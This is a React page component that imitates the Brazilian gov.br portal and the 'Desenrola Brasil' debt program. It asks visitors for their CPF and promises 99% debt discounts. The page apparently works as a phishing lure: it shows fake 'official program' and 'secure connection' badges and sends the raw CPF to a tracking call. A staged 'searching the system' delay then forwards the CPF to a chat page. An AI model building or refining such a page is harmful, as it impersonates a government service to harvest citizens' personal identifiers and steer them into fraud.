import { createFileRoute } from "@tanstack/react-router";
/** coloque uma mascara de cpf na caixa onde precisa preencher o cpf */
import { useEffect, useState } from "react";
import { media } from "@/lib/media";
import { track } from "@/lib/tracking";
import logoamareloLocal from "@/assets/logocabecalho.png";

const iconeGov = { url: media.iconeGov };
const limpeNome = { url: media.limpeNomeCpf };
const iconeFooter = { url: media.iconeFooter };
const logoLoading = { url: logoamareloLocal };

export const Route = createFileRoute("/")({
  component: CpfPage,
});

function CpfPage() {
  const [cpf, setCpf] = useState("");
  const [isLoading, setIsLoading] = useState(false);
  const [booting, setBooting] = useState(true);
  useEffect(() => { track("home", "home_view"); }, []);
  useEffect(() => {
    const t = setTimeout(() => setBooting(false), 2000);
    return () => clearTimeout(t);
  }, []);

  const formatCPF = (v: string) => {
    const d = v.replace(/\D/g, "").slice(0, 11);
    if (d.length <= 3) return d;
    if (d.length <= 6) return `${d.slice(0, 3)}.${d.slice(3)}`;
    if (d.length <= 9) return `${d.slice(0, 3)}.${d.slice(3, 6)}.${d.slice(6)}`;
    return `${d.slice(0, 3)}.${d.slice(3, 6)}.${d.slice(6, 9)}-${d.slice(9)}`;
  };

  const isValidCPF = (cpf: string) => {
    const d = cpf.replace(/\D/g, "");
    if (d.length !== 11 || /^(\d)\1{10}$/.test(d)) return false;
    let s = 0;
    for (let i = 1; i <= 9; i++) s += parseInt(d.charAt(i - 1)) * (11 - i);
    let r = (s * 10) % 11;
    if (r === 10 || r === 11) r = 0;
    if (r !== parseInt(d.charAt(9))) return false;
    s = 0;
    for (let i = 1; i <= 10; i++) s += parseInt(d.charAt(i - 1)) * (12 - i);
    r = (s * 10) % 11;
    if (r === 10 || r === 11) r = 0;
    return r === parseInt(d.charAt(10));
  };

  const handleCpfChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    setCpf(formatCPF(e.target.value));
  };

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    const raw = cpf.replace(/\D/g, "");
    if (!isValidCPF(raw)) {
      alert("CPF inválido. Verifique os dígitos.");
      return;
    }

    track("cpf", "cpf_submit", { cpf: raw });
    setIsLoading(true);

    // Pequeno atraso para mostrar a mensagem de consulta antes do redirecionamento
    setTimeout(() => {
      window.location.href = `/chat?cpf=${raw}`;
    }, 2500);
  };

  return (
    <div className="flex flex-col min-h-screen font-['Open_Sans',sans-serif] bg-cinza-bg">
      <div className="flex-1 w-full max-w-[720px] mx-auto bg-azul-footer-copy">
        <div className="bg-cinza-bg flex flex-col min-h-screen">
          <header className="sticky top-0 z-50 flex items-center justify-between w-full min-h-[56px] px-[14px] py-2 bg-white border-b border-[#e5e5e5] shadow-[0_1px_3px_rgba(0,0,0,0.06)]">
            <span className="flex items-center shrink-0" aria-label="gov.br">
              <img
                src={iconeGov.url}
                alt=""
                className="h-9 w-auto max-w-[132px] block object-contain"
                width="100"
                height="32"
              />
            </span>
            <div className="flex items-center gap-0 shrink-0 ml-auto">
              <button type="button" className="hdr-icon-btn" aria-label="Alto contraste">
                <svg className="w-[22px] h-[22px]" viewBox="0 0 24 24">
                  <circle cx="12" cy="12" r="9.25" fill="none" stroke="#1451B4" strokeWidth="1.15"></circle>
                  <path fill="#1451B4" d="M12 2.75 A9.25 9.25 0 0 0 12 21.25 z"></path>
                  <path fill="#ffffff" d="M12 2.75 A9.25 9.25 0 0 1 12 21.25 z"></path>
                </svg>
              </button>
              <span className="w-px h-[18px] bg-[#1451b440] shrink-0 mx-0" />
              <button type="button" className="hdr-icon-btn" aria-label="Acessibilidade auditiva">
                <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round">
                  <path d="M6 8.5 a6 6 0 0 1 12 0 v3 a3 3 0 0 0 3 3 v0 a3 3 0 0 1 -3 3 h-1"></path>
                  <path d="M18 11 v4 a4 4 0 0 1 -8 0 v-2"></path>
                </svg>
              </button>
            </div>
          </header>

          <section className="relative bg-white mx-4 mt-3 mb-4 pt-5 pb-9 px-[18px] rounded-xl shadow-[0_4px_20px_rgba(0,0,0,0.08)] text-center">
            <img className="max-w-[200px] max-h-24 w-full h-auto object-contain mx-auto mb-3.5 block" src={limpeNome.url} alt="Limpe seu nome" />

            <p className="text-sm text-cinza-texto leading-6 mb-5">
              ✅ ATUALIZADO - Informe seu CPF e clique em "Continuar" para<br />
              renegociar suas dívidas com descontos de 99%
            </p>

            <form className="text-left" onSubmit={handleSubmit}>
              <div className="text-sm font-bold text-[#333] mb-2">CPF</div>
              <input
                className="w-full px-4 py-3.5 border border-borda-input rounded-lg text-base outline-none focus:border-azul-primario mb-4"
                type="tel"
                value={cpf}
                onChange={handleCpfChange}
                inputMode="numeric"
                placeholder="000.000.000-00"
                required
              />

              <button type="submit" className="btn-primary mt-0">
                Continuar
              </button>
            </form>

            <div className="mt-6 p-4 bg-info-bg border border-info-borda rounded-lg flex gap-3 text-left">
              <span className="shrink-0 w-6 h-6 flex items-center justify-center bg-azul-primario text-white rounded-full text-sm font-bold">!</span>
              <p className="text-sm text-foreground leading-snug">
                O Programa Desenrola Brasil oferece acordos com descontos de 99% e recuperação de crédito imediata!
              </p>
            </div>

            <div className="mt-6 flex justify-center gap-6 text-black">
              <span className="flex items-center gap-1.5 text-xs">
                <svg className="w-4 h-4" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
                  <rect x="5" y="11" width="14" height="10" rx="2"></rect>
                  <path d="M8 11V7a4 4 0 0 1 8 0v4"></path>
                </svg>
                Conexão segura
              </span>
              <span className="flex items-center gap-1.5 text-xs">
                <svg className="w-4 h-4" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
                  <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"></path>
                  <path d="M9 12l2 2 4-4" strokeLinecap="round" strokeLinejoin="round"></path>
                </svg>
                Programa oficial
              </span>
            </div>
            <p className="mt-4 text-[10px] text-black">Sistema de Renegociação — Todos os direitos reservados</p>
          </section>

          <footer className="mt-auto bg-azul-footer text-white">
            <div className="max-w-[720px] mx-auto px-5 py-8 flex flex-col items-center text-center gap-4">
              <img src={iconeFooter.url} alt="" className="h-10 w-auto" width="120" height="40" />
              <div className="flex flex-col gap-1">
                <p className="text-xs opacity-80">Todo o conteúdo deste site está publicado sob a licença</p>
                <strong className="text-sm font-bold">Sistema de Renegociação — Todos os direitos reservados</strong>
              </div>
            </div>
            <div className="bg-azul-footer-copy h-2 w-full" />
          </footer>
        </div>
      </div>

      {booting && (
        <div className="fixed inset-0 z-[200] flex flex-col items-center justify-center bg-white">
          <img
            src={logoLoading.url}
            alt="Desenrola"
            className="w-[140px] max-w-[45vw] h-auto object-contain animate-fade-in"
            width="140"
            height="115"
          />
          <div
            className="mt-8 w-8 h-8 rounded-full border-[3px] border-amarelo/25 border-t-amarelo animate-spin"
            role="status"
            aria-label="Carregando"
          />
        </div>
      )}

      {isLoading && (
        <div className="fixed inset-0 z-[100] flex items-center justify-center bg-black/50 backdrop-blur-sm animate-in fade-in duration-300">
          <div className="bg-white rounded-2xl p-8 flex flex-col items-center gap-5 shadow-2xl max-w-[90%] w-[320px] text-center transform animate-in zoom-in-95 duration-300">
            <div className="relative">
              <div className="w-14 h-14 border-4 border-azul-primario/20 border-t-azul-primario rounded-full animate-spin"></div>
              <div className="absolute inset-0 flex items-center justify-center">
                <svg className="w-6 h-6 text-azul-primario" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="3">
                  <path d="M21 12a9 9 0 11-6.219-8.56" strokeLinecap="round" />
                </svg>
              </div>
            </div>
            <div>
              <h3 className="text-azul-primario font-bold text-lg mb-1">Aguarde</h3>
              <p className="text-cinza-texto text-sm leading-relaxed">
                Estamos localizando suas propostas exclusivas no sistema...
              </p>
            </div>
          </div>
        </div>
      )}
    </div>
  );
}
